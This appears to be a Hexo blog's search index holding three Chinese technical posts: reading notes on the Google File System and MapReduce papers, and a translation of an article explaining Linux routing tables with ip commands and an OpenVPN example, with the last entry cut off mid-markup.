<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>浅析 Google File System（一）</title>
      <link href="/2022/07/03/GFS1/"/>
      <url>/2022/07/03/GFS1/</url>
      
        <content type="html"><![CDATA[<blockquote><p>论文<a href="https://pdos.csail.mit.edu/6.824/papers/gfs.pdf" target="_blank" rel="noopener">下载</a></p></blockquote><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>继续拜读三驾马车，最近阅读了 GFS 的论文。这篇于 2003 年被收录在 SOSP 上的论文描述了一个工作在上千台机器的集群上的文件系统，其设计影响了后续很多项目，比如 HDFS 就是它的一种开源实现。我没有参与那个年代的技术变革，但是看了很多对这篇论文的评价，大家的观点基本是一样的，即，GFS 在技术上并没有什么创新点，它只是非常好地做了 trade-off，并以一种非常简单的设计做出了适合 Google 内部需求的强大系统。</p><p>于是这篇文章就用来记录一些我的读后总结，欢迎一起交流:-)</p><h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>GFS 的使用者是 Google 内部的一些应用（比如之前的 MapReduce），所以其设计就需要满足内部的需求。论文的第 1 节和第 2.1 节中都有一些需求上的描述，具体来说包括以下几点：1）GFS 应该工作在由很多常规设备组建的集群上，这意味着需要把“设备会出错”作为一种必然事件来对待；2）操作的文件都是大文件，通常有几个 GB 大小，所以 GFS 在大文件的处理上要优于小文件；3）在写入文件时，追加操作是非常频繁的，几乎没有随机写操作，所以 GFS 对追加写操作做了一些优化，并且也相对更强调它的一致性。</p><p>在设计上，GFS 中包括三个组件，分别是 Master、ChunkServer 和 Client，其中 Master 和 ChunkServer 都是用户态的程序，而 Client 以库的形式被业务代码使用。</p><p>下面简单介绍下这三个组件，更详细的内容见后文。</p><p>Client 负责根据业务代码的需求发送请求与 Master 和 ChunkServer 交互，从而完成各项操作，为了优化性能，它还会缓存一些信息在本地；</p><p>ChunkServer 负责实际的文件存储，它管理的基本单元就是 Chunk，一个完整的文件会被拆分成多个 Chunk，并被存储在 ChunkServer 上。为了更好地容错，每个 Chunk 都会保存多份，这些 replica 被分布在不同的 ChunkServer 上，其数量可以由用户指定。Chunk 在被创建时会被分配一个全局唯一的 Chunk handle 作为标识，这个标识有 64bit 大小，客户端可以使用它向某个 ChunkServer 索要数据。在表现上，每个 Chunk 都是一个按需动态扩展大小的文件（最大 64MB），也就是说 GFS 直接使用了 Linux 的文件系统来提供存储能力，而由于 Linux 在读取文件时自带缓存，所以 GFS 并没有实现自己的缓存；</p><p>Client 在读取文件时是只知道文件名的，那它如何知道文件对应的 Chunk 是哪些，而这些 Chunk 又在哪台  ChunkServer 上呢？这就要通过 Master 了，具体而言，Master 中保存了所有文件到 Chunk 的映射，以及 Chunk 的具体位置，Client 在读写文件时首先通过 Master 来获知对应的 Chunk 和其位置，然后就直接与对应的 ChunkServer 进行交互了，Master 在这里只是起到类似索引的作用。而除了这个功能，Master 还负责锁管理、垃圾回收、过期 Chunk 检测等功能。</p><h1 id="操作接口"><a href="#操作接口" class="headerlink" title="操作接口"></a>操作接口</h1><p>论文 2.2 小节中提到，GFS 并没有实现类似 POSIX 标准的文件系统接口，它支持的操作有 create、delete、open、close、read、write、snapshot、record append。除了这些操作外，根据后文的描述以及之前对 MapReduce 的解读，还可以推知 GFS 也支持 rename 操作。根据我的理解，这些操作可以被划分为三组，具体见下表：</p><table><thead><tr><th>组编号</th><th>操作</th><th>主要被操作的组件</th></tr></thead><tbody><tr><td>1</td><td>open/close</td><td>Client</td></tr><tr><td>2</td><td>create/delete/snapshot/rename</td><td>Master</td></tr><tr><td>3</td><td>read/write/record append</td><td>ChunkServer</td></tr></tbody></table><p>为什么这样区分呢？且听我细细道来。</p><h2 id="第1组"><a href="#第1组" class="headerlink" title="第1组"></a>第1组</h2><p>对于 open/close 操作，论文中并没有过多的提及，但我们前面提到为了优化性能，Client 会缓存一些信息。比如在读取时，它会通过 Master 查询“文件 A 的第 X 个 Chunk 在哪”这样的信息，并以文件名+Chunk下标作为键进行缓存，缓存的过期方式有两个，其一是达到了设置的过期时间，其二就是重新打开这个文件。对于重新打开文件这一点，论文 2.7.1 节中的描述是 <code>which purges from the cache all chunk in- formation for that file</code>。基于这一点，我推测文件的打开和关闭操作主要影响的是客户端，比如 open 操作用于在客户端建立对应文件的缓存结构，而 close 操作将这个结构释放掉。</p><p>我没有在论文中找到类似排他读写的操作，如果 GFS 支持这种操作，那么 open/close 必然要通知到 Master。与之类似的，如果 GFS 可以防止文件在读写时不会被删除，那么这两个操作也同样需要被通知到 Master。</p><h2 id="第2组"><a href="#第2组" class="headerlink" title="第2组"></a>第2组</h2><p>我们前面提到，Master 中保存了文件到 Chunk 的映射。这里所谓的文件，其实就是 /x/y/z 这样的一个字符串，GFS 并没有常规文件系统中的目录的结构（这种结构中记录了目录中的内容），所以我认为在实现上Master 的这种映射关系保存成 kv 存储也没问题，但是出于减小体积、加快查找速度、方便恢复（详见后文）等方面的考虑，GFS 将文件路径组织成树状结构，并称其为 Namespace。在这棵树上的每个节点都有一对锁，分别是 read 锁与 write 锁，两种锁相互配合来避免并发的操作导致 Namespace 的混乱。这里的操作指什么呢，主要指的就是第二组中的内容。</p><h3 id="create-操作"><a href="#create-操作" class="headerlink" title="create 操作"></a>create 操作</h3><p>顾名思义，create 用于在 Namespace 中建立一个新的节点，论文中没有提到 create 的流程，但我认为如果仅仅是 create 文件，那并不需要立即为其创建一个 chunk，可以把 chunk 的创建延迟到到对这个文件执行写入时。前面提到 Namespace 中的每个节点都有一对锁，在 create 一个新节点时这对锁也会参与进来。具体来说，假设我们要创建 /home/hygao/file1，那么在创建的过程中 /home、/home/hygao 都会被加上 read 锁，而 /home/hygao/file1 会被加上 write 锁。这意味着，我们可以同时创建 /home/hygao/file2，因为 /home 和 /home/hygao 都是 read 锁，而 read 锁之间并不冲突，但我们不能同时创建 /home/hygao/file1，因为 /home/hygao/file1 已经被上了 write 锁，write 锁之间是相互冲突的。</p><h3 id="delete-操作"><a href="#delete-操作" class="headerlink" title="delete 操作"></a>delete 操作</h3><p>论文中重点介绍了删除文件的场景，但没怎么提及删除目录的场景（从论文 4.1 小节中可以推断出 GFS 是支持删除目录的），所以这里仅讨论删除文件的相关内容。GFS 的 delete 包括 Master 中元数据的删除以及对应 Chunk 的删除，整个过程需要和 Master 的垃圾回收功能相配合。</p><p>具体而言，当用户申请删除一个文件时，GFS 将这个文件 rename 为一个隐藏名（其实个人电脑的回收站也是这个原理），这个隐藏名中记录了删除时的时间戳。GFS 会定期扫描 Namespace，所以它可以知道这些被标记为“应该删除”的文件已经在“回收站”中保存了多久，而用户可以配置一个最大保存时间，超过这个时间的“应该删除”的文件就会真的执行删除，在此之前，用户可以通过将这些文件 rename 成普通文件的方式来避免它们被删除。所谓”真的执行删除“，就是将这个节点从 Namespace 中移除掉，这样该文件对应的 Chunk 就变成了孤儿（orphaned chunk），即没有任何一个文件引用它们，此时 Master 就可以向对应的 ChunkServer 发送指令，让它们删除掉对应的 chunk，从而释放硬盘空间。</p><p>这种机制的好处在于删除操作会非常快速，且误删时在一定时间内还可以将其快速恢复。与之相对的，坏处在于所谓的删除其实并没有立即释放出硬盘的空间，这在空间吃紧的情况下是非常无力的。如何解决这个问题呢？根据论文的描述，如果用户重复删除同一个文件，那么垃圾回收会被加速；此外，用户可以指定一个<strong>节点</strong>的删除策略，这样在用户执行 delete 时文件就会被立即删除并释放空间，这样的删除不可恢复，而这里提到的节点，其实就代表可以在目录和文件两个维度进行配置。</p><p>其实根据上面的描述，可以推测出还有第三种加速删除的方式，因为 GFS 判断文件在“回收站”里保存了多久是根据文件名中的时间戳，而用户首先可以访问这些文件，其次可以对其 rename，那只要修改掉文件中的时间戳，让 GFS 认为这个文件已经被保存很久了，就可以在下次垃圾回收时将它清理掉了:-P</p><p>此外由于在对文件操作时（比如后面的 snapshot）不能将其删除，所以可以推测 delete 也会给文件加上 write 锁。</p><h3 id="snapshot-操作"><a href="#snapshot-操作" class="headerlink" title="snapshot 操作"></a>snapshot 操作</h3><p>根据我的理解，snapshot 操作应该类似于个人电脑上对文件或文件夹的复制，复制后的文件或目录拥有与复制源相同的内容，但对复制后的内容的修改不会影响到复制源。GFS 支持目录和文件两个级别的 snapshot，不过论文中只介绍了文件级别的流程，所以这里也同样仅讨论文件的 snapshot 操作。GFS 对这个操作做了一些优化，具体包括 CoW 和本地复制。</p><p>CoW 也就是 copy-on-write，这项技术旨在尽可能复用已有的内容。在 GFS 的场景下，表现为当用户执行 snapshot 时，新的文件对应的 chunk 同样使用源文件的 chunk。也就是说，如果有文件 /file1，其对应的 chunk 为 A、B、C，那么对其执行 snapshot 创建文件 /file2 时，这个新文件对应的 chunk 同样是 A、B、C。由于 snapshot 出的新文件本身就拥有和源文件同样的内容，所以在用户对新文件执行 read 操作时不会感受到有什么问题。</p><p>但是写文件时就不一样了，如前所述，对新文件的修改不会影响到源文件，这要怎么做呢？就是 CoW，即用户对文件对应的某个 chunk 执行写入时，Master 会让 ChunkServer 复制一个新的 chunk 出来，并为其分配 chunk handle，再把这个新的 chunk handle 返回给客户端，此后客户端的写入请求都在这个新的 chunk 上生效，从而避免了对源 chunk 的影响。这里 Master 会认为需要创建一个新的 Chunk，是因为每个 Chunk 保存了一个引用计数，如果它大于 1，那么就说明需要创建新的 Chunk，创建后会将源 Chunk 的引用计数减一，因为此时被读取的文件已经引用了新的 Chunk。</p><p>那么本地复制指的是什么呢，其实这是我自己起的名字:-P。它实际表示的是，Master 在创建新的 chunk 时，会让源 chunk 所在的 ChunkServer 来创建这个新的 chunk，这样的好处在于 chunk 的复制不需要走网络，相关的 IO 都仅发生在磁盘上，根据论文，Google 的磁盘读写速度差不多是网络的 3 倍。但是这也会有一个问题，就是如果源 ChunkServer 上的磁盘容量不足以创建这个新的 chunk 该怎么办，我不清楚文件系统会不会对此做什么优化，不过论文中并没有对这种情况作出说明。</p><p>最后，根据 4.1 小节，snapshot 会给文件加上 write 锁，从而避免 snapshot 的过程中发生删除、创建新文件等。</p><h3 id="rename-操作"><a href="#rename-操作" class="headerlink" title="rename 操作"></a>rename 操作</h3><p>论文中并没有描述 rename 的流程，但是从 MapReduce 以及文中的一些描述我们可以推断 GFS 是支持这个操作的，而且这个操作是原子的。根据这一点，我推测 rename 操作会给源文件与目标文件加 write 锁。</p><p>而 rename 的原理应该就是节点内容的迁移，比如把 /file1 文件 rename 成 /file2，就是把 /file1 对应的 chunk 给 /file2，然后删除 /file1 这条记录，这个操作只涉及 Master，不会对 ChunkServer 产生影响。这里的删除指的是从 Namespace 中直接删掉，而不是前面提到的 delete 操作。</p><h2 id="第-3-组"><a href="#第-3-组" class="headerlink" title="第 3 组"></a>第 3 组</h2><p>最后一组就是最重要的操作了，因为它主要与 ChunkServer 进行交互，也就是完成对文件的读写，这是一个文件系统的核心能力。虽然这是 GFS 中最有趣的部分，但是为了避免这篇文章太长，所以这部分以及后续的内容就放在下一篇文章中来讨论吧:-)</p>]]></content>
      
      
      <categories>
          
          <category> 分布式 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>浅析批处理框架 MapReduce</title>
      <link href="/2022/06/23/MapReduce/"/>
      <url>/2022/06/23/MapReduce/</url>
      
        <content type="html"><![CDATA[<blockquote><p>论文<a href="https://pdos.csail.mit.edu/6.824/papers/mapreduce.pdf" target="_blank" rel="noopener">下载</a></p></blockquote><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近拜读了 Google 三驾马车中的 MapReduce，这个被发布在 2004 年的论文中介绍了一个工作在分布式文件系统 GFS 之上的“批处理”框架。尽管由于各种原因， Google 在很久前就声称内部不再使用 MapReduce 了，但因为这个框架非常经典，以及当前依然有很多系统将它作为执行引擎（比如一些框架在 MapReduce 上添加 DSL 来做声明式系统），我认为研究这个框架仍然具有很大的意义。</p><h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>MapReduce 非常有趣的一点在于，它试图为使用者屏蔽掉分布式带来的<strong>大多数问题</strong>（没有完全屏蔽，因为 Partition 函数或 Combiner 函数都要求用户对任务在节点上的分布有一个明确的感知），诸如拆分输入、并行执行、错误处理、节点通信等底层的问题都由框架来处理。在使用上，它要求用户<strong>至少</strong>提供一个 Map 任务和一个 Reduce 任务，通常而言，Map 用于处理并行任务，而 Reduce 则将 Map 的输出进行聚合并产生最终的输出。</p><p>框架会将这些任务分配给集群中的多个节点来做分布式的执行。这里借用论文中提供的执行说明图，来简单阐述下框架的执行过程（结合论文 Appendix A 中的代码来看这幅图会更好一些，但由于篇幅原因，这里就不把相应的内容贴过来了）：</p><p><img src="/images/mapreduce1.png" alt="MapReduce 执行过程"></p><p>首先，对于一个任务而言，集群中存在 master 和 worker 两类<strong>节点</strong>（为了方便描述，这里将“分配到 master 程序的节点”称为 master 节点，worker 同理），顾名思义，master 负责协调任务的执行，worker 则是干活的。从论文提供的代码中可以看到，worker 的数量可以通过 <code>spec.set_machines(&lt;数量&gt;)</code> 来设置，不过注释中提到这里是设置“最多使用的机器数量”。与之相对的，master 则只有一个。</p><p>用户要做的任务是定义 Map 和 Reduce，然后声明输入文件和输出文件的名字，根据论文提供的代码，用户可以通过 <code>out-&gt;set_filebase(&lt;前缀&gt;)</code> 声明输出文件的前缀，比如 <code>out-&gt;set_filebase(&quot;/gfs/test/freq&quot;)</code>，而输出文件剩余的部分取决于 reduce 的数量，因为一个 reduce 对应一个输出文件。如果有 100 个 reduce，那么最终就会生成 /gfs/test/freq-00000-of-00100、/gfs/test/freq-00001-of-00100 这样的文件。不过不清楚为什么要从 0 开始，如果这样那么最后一个文件的名字可能就是 /gfs/test/freq-00099-of-00100，看起来怪怪的。</p><p>当用户定义了 Map 和 Reduce 任务后，master 会给 worker 分配任务，由于通常而言 map 和 reduce 的数量和都是大于 worker 的数量的，所以一个 worker 可能会被分配到多个任务。那么 map 和 reduce 的数量是如何确定的呢？对于 map 而言，数量是自动确定的。框架会把输入文件拆分成 16～64 MB 的一个个输入块（split），每个块的具体大小由用户控制。这样一来，只要知道输入文件的大小，就可以知道需要被分割成多少个输入块，而由于一个 map 任务处理一个输入块，所以 map 任务的数量也就知道了；与之相对的，reduce 任务的数量则由用户通过 <code>out-&gt;set_num_tasks(&lt;数量&gt;)</code> 自己定义。</p><p>Map 任务读取输入，根据配置好的规则将输入解析成一个一个的 Key-Value pair，然后用这个 k-v pair 作为入参调用用户提供的代码来产生输出，输出同样以 k-v pair 的形式表示，首先会被写入到内存中，然后由框架周期性地将这些结果写入到<strong>本地磁盘</strong>（注意和 GFS 的全局存储区分开）中。在写入的过程中会调用用户提供的分区函数对输出进行分区，比如 <code>hash(Key) % &lt;Reduce 任务的数量&gt;</code>，因此一个 map 任务可能会产生很多分区。map 任务产生的这些文件对应的位置会上报给 master 节点，然后 master 节点会将各个分区文件的位置发给对应的 reduce 任务。</p><p>当 reduce 任务收到 master 节点的通知时，它会通过 RPC 来从各个 map 任务那里拉取属于自己分区的文件。而当 reduce 任务拉取到所有的文件时，它会对这些文件中的 k-v pair 做排序，排序的结果使得所有具有相同 key 的 value 被聚合在一起，而 key 本身则也根据其语义被排序。对于排序本身而言，根据内存中是否能容纳所有的数据，reduce 任务会按需使用硬盘做辅助空间进行外部排序。</p><p>经过这样的处理后，框架会遍历排好序的结果，依次为其调用用户提供的 reduce 代码。代码接受一个 key 和一个迭代器作为参数，迭代器中的内容是属于这个 key 的所有 value，之所以要使用迭代器而不是一个简单的列表，是为了避免一个 key 中的所有 value 的数量过大，导致内存不能将其容纳进来。迭代器屏蔽了数据的来源，不管数据是来自于内存还是硬盘，在代码层面的处理都是相同的。</p><p>当分区中所有的内容都被用户提供的 reduce 任务处理后，就会在前文所述的输出文件中产生处理后的结果。而到此为止，整个 MapReduce 任务就结束了。</p><h1 id="细节"><a href="#细节" class="headerlink" title="细节"></a>细节</h1><p>前面描述了一次 MapReduce 任务的大概流程，在这个基础上，依然有一些细节问题值得探讨，下面按发生的顺序来一一阐述。</p><p>首先，Google 的 MapReduce 是运行在 GFS 集群上的，作为一个分布式的文件系统，GFS 将文件按 64 MB拆分成几个小块，并存储在不同的机器上，而这些机器很可能就被作为了 MapReduce 的 worker。这就给了框架进行优化的空间，具体来说，master 可以通过 GFS 获知到输入文件的布局，比如节点 A 上有文件块 B，而节点 A 又是一个 worker，那么 master 就可以把处理 B 的 map 分配到节点 A 上，这样 map 在读取输入块时就不需要通过网络来拉取数据，直接从本地就可以获取到，从而节省了不必要的网络传输。</p><p>其次，map 在读取输入时，实际上读取到的是经过拆分的输入块，该输入块的大小由用户来定义。但是，考虑这样一种情况，假设用户将输入块的大小定义为 16MB，但是这个输入块中最后一条记录是不完整的，对于这整条记录而言，它的前半部分在这个输入块中，而后半部分在下一个输入块中。在这样的情况下，如果依然严格按照 16MB 进行拆分，那么这两个输入块对应的 map 任务都会因为这条不完整的记录而出现问题。对于这个问题，论文 4.4 节表示输入是被一种叫做 reader 的组件来拆分的，而 reader 是知道如何将文件拆分成有意义的记录的（原文：<code>Each input type implementation knows how to split itself into meaningful ranges for processing as separate map tasks</code>），所以我猜测在 reader 这一层面会根据具体的需求灵活地分隔文件，也即前文所述的 16～64 MB 的限制并不是一个硬性限制。</p><p>然后，用户可以提供 Partition 函数来帮助 map 决定输出的内容需要被存储的位置。除此之外，用户还可以提供 Combiner 函数。关于这个组件的作用，论文 4.3 节有详细的描述，可以简单地将其理解为一种预处理。论文提供的代码中，被用作 reduce 任务的内容同样被作为了 combiner，这意味着 combiner 函数在执行前，map 产生的内容应该是被排好序的。如论文 4.2 节所言，给定一个分区，内部的 key 是有序的。那么结合 combiner 来看，这个有序就不仅指 reduce 收到的完整的 partition 内容是有序的，对于 map 产生的部分 partition，内部的内容也同样是有序的才对。</p><p>接着，MapReduce 提供一种备份任务机制。具体而言，当 MapReduce 过程近乎完成时，框架会把那些尚未完成的任务分配给空闲的 worker，这样同样的任务就有可能被多个 worker 执行，而任意一个 worker 执行成功，master 都会认为这个任务执行成功，从而避免某个 worker 因为<strong>各种外部原因</strong>（比如硬盘老化导致写入时要不停地进行纠错从而降低写入速度）拖慢整个 MapReduce 的执行速度。</p><p>最后，一些特殊的输入可能导致 map/reduce 任务异常退出，这可能是因为用户的代码有 bug，也可能是因为记录本身有问题。要避免因为这种问题导致 MapReduce 无法正常完成，最好的解决办法当然是找出 bug 或记录的问题，但除此之外，框架也允许用户跳过这个会导致问题的记录。具体而言，框架提供了一种特殊的运行模式，在这种模式下，如果 map/reduce 任务异常退出，那么 master 可以感知到是因为哪条记录，然后重新把任务分配给 worker 让其重新执行，如果这次执行同样发生了异常退出，那么 master 在下一次分配这个任务时会告知 worker 跳过这条有问题的记录，从而避免流程进入 执行-异常退出-执行 的死循环中。</p><h1 id="错误处理"><a href="#错误处理" class="headerlink" title="错误处理"></a>错误处理</h1><p>尽管在使用上基本类似于单机框架，但 MapReduce 本质上是作用在分布式环境下的，对于一个分布式系统而言，错误处理永远是一个特别重要的话题。下面来探讨下 MapReduce 框架是如何进行错误处理的。</p><p>在深入机制之前，我们首先要明确 MapReduce 是一个批处理框架，这意味着实时性并不是特别重要，如果用户提交了一个任务，需要几分钟乃至几个小时才能执行完成，这都是一个非常正常的情况。也正因为如此，MapReduce 的错误处理非常简单，最核心的就是<strong>重试</strong>。</p><p>因为需要重试，所以 map/reduce 任务的类型是有限的，根据论文的描述，它应该是确定性（deterministic）的，也就是说，同一个任务不论执行多少次，产生的输出都应该是一样的。除此之外，我认为任务本身还应该是幂等的，这意味着类似“每处理一条记录就写一条日志来标识”的操作是有问题的，因为重试很可能导致某条记录对应的日志不唯一。</p><p>在机制上，master 节点会定期地 ping 一下所有的 worker 节点，如果某个节点没有回复响应，那么 master 就将这个 worker 标记为异常，然后将它上面运行的所有任务在正常的 worker 上重新执行。那么，重试对整个执行流程有什么影响吗？答案是没什么影响，我们分别针对 map 和 reduce 来讨论。</p><p>首先对于 map 而言，master 有这样一条限制：如果已经从一个 map 获取到了其上报的中间文件信息，且这个 map 所在的 worker 是正常的，那么会忽略不同 worker 上的同一个 map 上报的信息。这条限制也是前文所述的备份任务得以正常执行的前提。因此，如果一个 map 所在的 worker 异常了，那么 master 会将同样的 map 分配给其他的 worker，即便后面这个 worker 恢复了，master 也会从这两份 map 上报的信息中选择更早的那一份作为最终的文件路径。如前所述，这些输出文件是被保存在 map 所在 worker 自己的本地磁盘上的，所以只要两个 map 所在的 worker 不同，产生的文件就互不影响。而确定了最终的文件路径后，master 会将其通知给所有的 reduce，这时如果哪个 reduce 没有获取或尚未获取完这个 map 对应的输出文件，那么将继续从这个新的 worker 上拉取对应的输出文件。</p><p>然后是 reduce，为了避免因为重试导致的多个 reduce 实例一起写入同一个最终输出文件（例如 /gfs/test/freq-00001-of-00100），每个 reduce 实际上是先写一个相互隔离的临时文件的。也就是说，即便是同一个 reduce 任务的不同实例，写入的临时文件也是不同的。在整个 reduce 任务完成后，框架将这个临时文件更名为最终输出文件的名字，而对于 GFS 而言，更名操作是原子性的，这就保证了最终输出文件的完整性。</p><p>但是仔细考虑 reduce，会发现很可能最终 MapReduce 执行完成后，GFS 上因为重试而保存了多份同样的内容，其中之一作为最终的输出文件，剩下的都是临时文件，这显得有些冗余。但是，其实 GFS 本身保证写入操作的一致性就是“至少一次”，也就是说，使用 GFS 写入文件时（实际上是追加写），本身就可能产生多份重复的内容，只不过在读取时不会感知到。因此，MapReduce 导致的这份“冗余”，在这样的环境下就显得合情合理了。</p>]]></content>
      
      
      <categories>
          
          <category> 分布式 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>【好文翻译】如何解读路由表中的信息</title>
      <link href="/2022/06/11/Interpreting-Routing-Table/"/>
      <url>/2022/06/11/Interpreting-Routing-Table/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>为了了解 <code>ip route</code> 命令显示的信息有什么含义，以及它对 Linux 收发网络包的影响，我在网络上搜索了很多文章，但是这些文章多数都仅仅是按序描述每个字段的作用，没有通过具体的例子来加深印象。偶然间，在 Diego Assencio 大大的个人网站里发现了<a href="https://diego.assencio.com/?index=d71346b8737ee449bb09496784c9b344#:~:text=On%20Linux%2C%20there%20are%20two%20commands%20which%20are,the%20ip%20command%2C%20open%20a%20terminal%20and%20run%3A" target="_blank" rel="noopener">这篇文章</a>，拜读之后感觉收获颇丰。</p><p>这篇文章给出了两个例子，第一个例子是常见的网络访问，第二个则是在 VPN 环境下的网络访问，通过阅读这篇文章，至少对于我而言有种茅塞顿开的感觉，尤其是后面 VPN 的例子，读完后就能更好地了解容器网络或虚拟机网络的实现方式。</p><p>所以本文尝试翻译 Diego Assencio 的文章，一方面做一个初次翻译的尝试，一方面备份在这里方便未来自己的阅读，侵删。</p><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p>这篇文章将会描述如何解读 Linux 系统中路由表的信息。所谓路由表其实就是一个包含了许多路由规则的表单，网络包会根据它的目的地址来选择使用其中的哪条规则。</p><p>为了更好地理解这篇文章描述的内容，读者必须先理解两件事情：<strong>CIDR 表示法</strong>（这东西以 <code>&lt;network-prefix&gt;/&lt;netmask-length&gt;</code> 的格式来声明一个 IP 地址的子网）以及<strong>最长前缀匹配算法</strong>（译者注：事实上，对 tun/tap 设备的了解也是必须的，这对于理解下文 VPN 的例子尤其重要）。如果读者目前还不了解它们，请先花一些时间来学习，然后再继续阅读本文。此外，我们接下来要描述的例子都基于 IPv4 网络，但是相关的概念对 IPv6 网络也同样适用。</p><p>在 Linux 系统上，主要有两个命令用于获取路由表信息：<strong>route</strong> 和 <strong>ip</strong>。本文将使用 ip 命令，因为它输出的内容比 route 命令更加易于解读。为了使用 ip 命令来显示操作系统中路由表的内容，请打开一个终端模拟器（terminal），然后运行下面的命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip route show</span><br></pre></td></tr></table></figure><p>这个命令的输出取决于机器的网络配置以及实际的网络拓扑。比如让我们来考虑一个通过无线网络连接到路由器以访问外部网络的机器，机器的 IP 地址为 192.168.1.100，而路由器的地址为 192.168.1.1，那么 ip 命令的输出就有可能如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">default via 192.168.1.1 dev wlan0</span><br><span class="line">192.168.1.0/24 dev wlan0  proto kernel  scope link  src 192.168.1.100</span><br></pre></td></tr></table></figure><p>让我们从第二行开始解读这个输出。这一行表示“任何被发往 192.168.1.0/24 这个网络的包都会以 192.168.1.100 作为源地址，然后被 wlan0 这个设备发送出去”，192.168.1.100 这个地址是 DHCP 服务端为 wlan0 设备分配的地址。而剩下的部分则可能不那么有趣：<code>proto kernel</code> 表示这条路由是被操作系统内核在自动配置期间创建的；而 <code>scope link</code> 则表示在 192.168.1.0/24 这个网络中的目标地址都仅对 wlan0 这个设备有效。</p><p>而这个输出中的第一行则表示所有网络包的默认路由（即，当没有其他路由可以被使用时，网络包将使用这一条路由）。具体含义指网络包将被 wlan0 设备发送到默认网关（译者注：通常就是指家用路由器），而这个网关的地址是 192.168.1.1。</p><p>ip 这个命令的输入非常灵活，例如可以只输入命令的一部分，然后这个输入就会被 ip 命令自动在内部进行补全。举例来说，下面所有的命令实际上都是等价的：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ip r s</span><br><span class="line">ip r show</span><br><span class="line">ip ro sh</span><br><span class="line">ip route show</span><br></pre></td></tr></table></figure><p>接下来让我们来考虑一个更复杂的例子，当设备连接到一个虚拟专用网络（VPN）时，所有网络流量都会经过一个加密隧道（tunnel）被发送到 VPN 服务端。我们以一个 OpenVPN 的网络作为例子，在这个例子中，我们有如下设备及其 IP 地址：</p><ul><li>tun0：192.168.254.10</li><li>wlan0：192.168.1.100</li><li>路由器：192.168.1.1</li><li>OpenVPN 服务端：95.91.22.94</li></ul><p>一个网络包在被发往目的地的途中会经历如下的流程：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">原始网络包 --&gt; tun0 -加密后的网络包-&gt; wlan0 --&gt; 路由器 --&gt; OpenVPN 服务端 -解密后的网络包-&gt; 目的地</span><br></pre></td></tr></table></figure><p>首先，一个虚拟网络设备（通常叫做 tun0）会被创建，然后一些路由信息会被加入到路由表中，这些信息引导<strong>几乎所有</strong>的流量经过 tun0 这个设备，在这里网络包会被加密，然后最终通过 wlan0 这个网络设备被发送到 OpenVPN 的服务端。</p><p>下面是一种可能的路由表输出，这个输出来源于一个已经连接到 OpenVPN 服务端的设备（也就是 OpenVPN 的客户端）：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">0.0.0.0/1 via 192.168.254.9 dev tun0</span><br><span class="line">default via 192.168.1.1 dev wlan0</span><br><span class="line">95.91.22.94 via 192.168.1.1 dev wlan0</span><br><span class="line">128.0.0.0/1 via 192.168.254.9 dev tun0</span><br><span class="line">192.168.1.0/24 dev wlan0  proto kernel  scope link  src 192.168.1.100</span><br><span class="line">192.168.254.0/24 via 192.168.254.9 dev tun0</span><br><span class="line">192.168.254.9 dev tun0  proto kernel  scope link  src 192.168.254.10</span><br></pre></td></tr></table></figure><p>直接解释这个路由表中的所有细节显得有些单调乏味，所以我们将关注这些输出中的重点部分。请注意第二行：这个设备上的默认路由并没有发生变化。然而，第一行和第四行引入了两条新的路由规则，这将完全改变游戏的规则：被发送到 0.0.0.0/1 和 128.0.0.0/1 两个网络的所有网络包都会经过 tun0 设备，并且以 192.168.254.9 作为网关的地址。</p><p>这里需要注意的是，0.0.0.0/1 和 128.0.0.0/1 分别匹配目标地址的第一个比特位为 0 和 1 的网络包。当它们一起工作时，就可以<strong>代替第二行的规则成为新的默认路由规则</strong>。因为对于任何一个网络包而言，它的目标地址的第一个比特位不是 0 就是 1，而根据<strong>最长前缀匹配算法</strong>，网络包将优先选择这两条规则（译者注：可以认为 default 路由中目标地址子网掩码的长度为 0）。因此，当 OpenVPN 进程为主机创建了这两条路由后，所有的网络包都会默认被发往 tun0 设备，而从这里开始，网络包就会被加密发送到 95.91.22.94（OpenVPN 服务端的地址）。显而易见，上面输出中的第三行描述了这部分内容：被发往 95.91.22.94 的网络包都由 wlan0 设备以 192.168.1.1 作为网关发出。</p><p>一些读者可能会好奇上面的输出中 192.168.254.9 这个地址，那么它是怎么来的呢？事实上，OpenVPN 在创建 tun0 设备时是以 point-to-point 模式创建的，这意味着这个设备在工作时就好像直接连接在另一端上（译者注：也就是不需要通过中间路由器进行转发），而这个 192.168.254.9 就是另一端的设备，它实际上就是 OpenVPN 的服务端。服务端负责创建 192.168.254.0/24 这个虚拟网络，然后从地址池中选出空闲的 IP 地址分配给那些连接到自己的主机。如上面输出的最后一行所示，192.168.254.10 就是这个路由表所在的主机被分配到的地址，而 192.168.254.9 则是服务端在这个虚拟网络中的地址。</p><p>读者可以通过运行下面的例子来更清晰地证明上面的描述：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip addr show dev tun0</span><br></pre></td></tr></table></figure><p>对于我们的例子而言，这条命令的输出可以非常清晰地展示前文所述的 point-to-point 连接（注意倒数第二行）：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 